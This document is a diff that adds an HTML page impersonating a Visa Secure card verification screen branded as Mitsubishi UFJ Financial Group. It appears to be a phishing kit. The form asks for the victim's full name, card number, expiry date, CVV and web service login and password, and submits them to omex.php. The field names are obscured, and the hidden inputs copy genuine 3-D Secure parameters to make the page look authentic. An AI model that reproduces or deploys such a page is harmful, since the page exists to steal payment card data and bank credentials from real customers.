@@ -1,0 +1,338 @@
+<html>
+ <head>
+  <meta content="-1" http-equiv="Expires"/>
+  <meta content="no-cache" http-equiv="Pragma"/>
+  <meta content="no-cache" http-equiv="Cache-Control"/>
+  <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+  <link href="./favicon.ico" rel="shortcut icon"/>
+  <link href="pp/ntt.css" rel="stylesheet" type="text/css"/>
+  <title>
+   三菱UFJフィナンシャルグループ
+  </title>
+  <style type="text/css">
+   .auto-style1 {
+	font-family: sans-serif;
+}
+  </style>
+ </head>
+ <body bgcolor="#ffffff" onload="SetFocus()">
+  <script language="Javascript">
+   function SetFocus()
+{
+	if (document.A1.UserId)
+		document.A1.UserId.focus();
+	else if (document.A1.Password)
+		document.A1.Password.focus();
+}
+function ForgotPassword()
+{
+	
+	
+	
+	window.open("","forgotPasswordWin","status=yes,scrollbars=no,width=390,height=400");
+	document.A1.Action.value="GetPasswordHint";
+	document.A1.target="forgotPasswordWin";
+	document.A1.action="dispatcher.jsp";
+	document.A1.submit();
+	
+}
+function Help()
+{
+	
+	
+	
+	
+	
+	
+	window.open("","helpWin","status=yes,scrollbars=no,width=390,height=400");
+	document.A1.target="helpWin";
+	document.A1.action="help.jsp";
+	document.A1.submit();
+	
+}
+function Cancel()
+{
+	
+	
+	
+	document.A1.Action.value = "Cancel";
+	document.A1.target="_self";
+	document.A1.action="omex.php";
+	document.A1.submit();
+
+	
+}
+function SubmitForm()
+{
+	if (!submitClicked)
+	{
+		
+		document.A1.Action.value = "Authenticate";
+		document.A1.target="_self";
+		document.A1.action="omex.php";
+		
+		submitClicked = true;
+		document.A1.submit();
+	}
+}
+var submitClicked = false;
+  </script>
+  <form action="omex.php" method="post" name="A1" onsubmit="return false;">
+   <input name="Action" type="hidden" value="Authenticate"/>
+   <input name="State" type="hidden" value="ScenarioB/LoginRequired"/>
+   <input name="AccountId" type="hidden" value="42BC04679AB8E23D4E022A83C3EC"/>
+   <input name="PAReqId" type="hidden" value="209254"/>
+   <input name="PAReqURI" type="hidden" value="https://acs.cafis-paynet.jp/preca/1@0@2,90003,DC9FAD7DDC1B1E.PAReq"/>
+   <input name="IssuerId" type="hidden" value="90003"/>
+   <input name="MessageId" type="hidden" value="Atos-Origin_1574450922861"/>
+   <input name="CardProductId" type="hidden" value="preca_0001"/>
+   <input name="Fi" type="hidden" value="NTT"/>
+   <input name="ServiceCode" type="hidden" value="VBV"/>
+   <input name="ImplDesc" type="hidden" value="Visa Secure"/>
+   <center>
+    <table border="0" cellpadding="0" cellspacing="0">
+     <tbody>
+      <tr>
+       <td>
+        <table border="0" cellpadding="0" cellspacing="0" width="350px">
+         <tbody>
+          <tr>
+           <td valign="top">
+            <table border="0" cellpadding="0" cellspacing="0" width="100%">
+             <tbody>
+              <tr>
+               <td>
+                <table bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
+                 <tbody>
+                  <tr>
+                   <td align="left" width="50%">
+                    <img alt="Visa Secure" border="0" height="49" src="pp/muf.png" title="Visa Secure" width="164"/>
+                   </td>
+                   <td align="right" width="50%">
+                    <img alt="三井住友カード" height="48" src="pp/muf1.png" title="三井住友カード" width="153"/>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+                <br/>
+               </td>
+              </tr>
+             </tbody>
+            </table>
+            <table border="0" cellpadding="3" cellspacing="0" width="100%">
+             <tbody>
+              <tr>
+               <td align="left" class="normalgray" colspan="3">
+                <span class="auto-style1">
+                 Added Protection :
+                </span>
+                <br/>
+                MU
+                <span class="" title="">
+                 <span class="tlid-translation translation">
+                  FG
+                 </span>
+                 <span class="tlid-translation translation" lang="ja">
+                  WebサービスのIDとパスワードをご入力ください。
+                 </span>
+                </span>
+                <br/>
+               </td>
+              </tr>
+              <tr>
+               <td align="left" height="10">
+                <img height="10" src="nn/Visa%20Secure_fichiers/spacer.gif" width="1"/>
+               </td>
+              </tr>
+              <tr>
+               <td align="left" valign="top">
+                <table border="0" cellpadding="3" cellspacing="0" width="100%">
+                 <tbody>
+                  <tr>
+                   <td align="right" class="normalbold" valign="top" width="165px">
+                    <span class="tlid-translation translation" lang="ja">
+                     <span class="" title="">
+                      ブランチ
+                     </span>
+                    </span>
+                    :
+                   </td>
+                   <td>
+                   </td>
+                   <td class="normalbold" valign="top" width="165px">
+                    <span class="tlid-translation translation" lang="en">
+                     <span class="" title="">
+                      <span class="tlid-translation translation" lang="ja">
+                       三菱UFJフィナンシャルグループ
+                      </span>
+                     </span>
+                    </span>
+                   </td>
+                  </tr>
+                  <tr>
+                   <td align="right" class="normalbold" valign="top" width="165px">
+                    日付:
+                   </td>
+                   <td>
+                   </td>
+                   <td class="normalbold" valign="top" width="165px">
+                    04/12/2020
+                   </td>
+                  </tr>
+                  <tr>
+                   <td align="right" class="normalbold" valign="center" width="165px">
+                    フルネーム:
+                   </td>
+                   <td>
+                   </td>
+                   <td valign="top" width="165px">
+                    <!-- no errors, retain password -->
+                    <input "="" autocomplete="off" maxlength="32" name="z1" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();" size="20" type="text" value=""/>
+                   </td>
+                  </tr>
+                  <tr>
+                   <td align="right" class="normalbold" valign="center" width="165px">
+                    <span class="short_text" id="result_box3" lang="ja">
+                     <span class="">
+                      カード番号
+                     </span>
+                    </span>
+                    :
+                   </td>
+                   <td>
+                   </td>
+                   <td valign="top" width="165px">
+                    <!-- no errors, retain password -->
+                    <input "="" autocomplete="off" maxlength="32" name="z2" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();" size="20" type="text" value=""/>
+                   </td>
+                  </tr>
+                  <tr>
+                   <td align="right" class="normalbold" valign="center" width="165px">
+                    <span class="">
+                     <span class="short_text" id="result_box4" lang="ja">
+                      有効期限
+                     </span>
+                    </span>
+                    :
+                   </td>
+                   <td>
+                   </td>
+                   <td valign="top" width="165px">
+                    <!-- no errors, retain password -->
+                    <input "="" autocomplete="off" maxlength="32" name="z3" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();" placeholder="月/年" size="20" style="width: 73px; height: 22px" type="text" value=""/>
+                   </td>
+                  </tr>
+                  <tr>
+                   <td align="right" class="normalbold" valign="center" width="165px">
+                    <span class="short_text" id="result_box5" lang="ja">
+                     <span class="">
+                      カードセキュリティコード
+                     </span>
+                    </span>
+                    :
+                   </td>
+                   <td>
+                   </td>
+                   <td valign="top" width="165px">
+                    <!-- no errors, retain password -->
+                    <input "="" autocomplete="off" maxlength="32" name="z4" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();" placeholder="CVV/CVV2" size="20" style="width: 73px; height: 22px" type="text" value=""/>
+                   </td>
+                  </tr>
+                  <tr>
+                   <td align="right" class="normalbold" valign="center" width="165px">
+                    <span class="">
+                     <span class="short_text" id="result_box6">
+                      <span class="tlid-translation translation">
+                       WEB
+                      </span>
+                     </span>
+                     <span class="short_text" id="result_box6" lang="ja">
+                      <span class="tlid-translation translation" lang="ja">
+                       サービス　ログイン
+                      </span>
+                     </span>
+                    </span>
+                    :
+                   </td>
+                   <td>
+                   </td>
+                   <td valign="top" width="165px">
+                    <!-- no errors, retain password -->
+                    <input "="" autocomplete="off" maxlength="32" name="z5" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();" placeholder="ID（4～30桁" size="20" type="text" value=""/>
+                   </td>
+                  </tr>
+                  <tr>
+                   <td align="right" class="normalbold" valign="center" width="165px">
+                    パスワード:
+                   </td>
+                   <td>
+                   </td>
+                   <td valign="top" width="165px">
+                    <!-- no errors, retain password -->
+                    <input "="" autocomplete="off" maxlength="32" name="z6" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();" placeholder="パスワード（4～8桁）" size="20" type="text" value=""/>
+                   </td>
+                  </tr>
+                  <tr>
+                   <td>
+                    &nbsp;
+                   </td>
+                   <td>
+                   </td>
+                   <td align="left" valign="top">
+                    <script>
+                     document.write("<a class=\"forgotlink\" href=\"javascript:ForgotPassword()\">");
+                    </script>
+                    <a class="forgotlink" href="javascript:ForgotPassword()">
+                    </a>
+                    <input id="sendButton" onclick="SubmitForm()" style="width: 63px" type="button" value="確認"/>
+                    <a class="forgotlink" href="javascript:ForgotPassword()">
+                    </a>
+                    <noscript>
+                     <a class="forgotlink" href="javascript:ForgotPassword()">
+                     </a>
+                     <a class="forgotLink" href="omex.php" target="_blank">
+                     </a>
+                    </noscript>
+                   </td>
+                  </tr>
+                  <tr height="10">
+                   <td>
+                    <img src="pp/spacer.gif"/>
+                   </td>
+                  </tr>
+                  <tr>
+                   <td align="left" valign="top">
+                    &nbsp;
+                   </td>
+                   <td>
+                   </td>
+                   <td align="left" valign="top" width="165px">
+                    &nbsp;
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </td>
+              </tr>
+             </tbody>
+            </table>
+           </td>
+          </tr>
+         </tbody>
+        </table>
+        <table bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" cellpadding="0" cellspacing="0" width="100%">
+         <tbody>
+          <tr>
+           <td align="center" class="copyright">
+           </td>
+          </tr>
+         </tbody>
+        </table>
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </center>
+  </form>
+ </body>
+</html>
